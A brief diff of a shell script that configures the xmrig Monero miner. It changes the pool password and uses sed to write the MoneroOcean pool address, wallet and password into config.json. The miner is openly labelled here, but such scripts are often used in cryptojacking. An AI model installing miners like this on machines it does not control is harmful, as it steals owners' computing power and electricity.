@@ -261,7 +261,7 @@ fi
 
 echo "[*] Miner $HOME/moneroocean/xmrig is OK"
 
-PASS='hello3'
+PASS='hello4'
 sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/moneroocean/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/moneroocean/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/moneroocean/config.json
